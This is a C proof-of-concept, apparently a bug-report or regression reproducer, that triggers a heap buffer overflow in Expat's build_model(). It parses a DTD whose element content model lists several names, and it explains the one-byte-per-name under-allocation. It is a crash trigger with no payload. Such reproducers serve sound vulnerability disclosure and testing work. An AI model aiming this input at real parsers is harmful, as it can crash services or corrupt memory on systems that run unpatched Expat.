/* Proof-of-concept for a heap buffer overflow in Expat's build_model().
 *
 * Driven entirely through the public API with in-contract input:
 *   - XML_ParserCreate / XML_SetElementDeclHandler / XML_Parse / XML_ParserFree
 *   - a well-formed XML document declaring an element with a content model
 *     that contains several element names.
 *
 * When an ElementDeclHandler is installed, Expat materialises the content
 * model via build_model().  build_model() allocates a single block holding the
 * XML_Content node array followed by a gapless list of NUL-terminated name
 * strings.  The string area is sized from dtd->contentStringLen.  On the
 * vulnerable tree, contentStringLen accounts only the characters of each name
 * (no terminator) while build_model() still writes "<name>\0" per name, so the
 * string area is under-allocated by one byte per name and the final writes
 * spill past the end of the allocation -> AddressSanitizer heap-buffer-overflow.
 */

#include <expat.h>

#include <stdlib.h>
#include <string.h>

static void XMLCALL
handle_element_decl(void *userData, const XML_Char *name, XML_Content *model) {
  XML_Parser parser = (XML_Parser)userData;
  (void)name;
  XML_FreeContentModel(parser, model);
}

int
main(void) {
  XML_Parser parser = XML_ParserCreate(NULL);
  if (parser == NULL)
    return 2;

  XML_SetUserData(parser, parser);
  XML_SetElementDeclHandler(parser, handle_element_decl);

  /* Well-formed: an element declaration with a sequence content model whose
     children are element names.  Each name contributes "<name>\0" to the
     string area that build_model() writes. */
  static const char doc[]
      = "<!DOCTYPE root [\n"
        "<!ELEMENT root (alpha, beta, gamma, delta, epsilon)>\n"
        "]>\n"
        "<root/>\n";

  enum XML_Status status
      = XML_Parse(parser, doc, (int)(sizeof(doc) - 1), /*isFinal=*/1);
  (void)status;

  XML_ParserFree(parser);
  return 0;
}
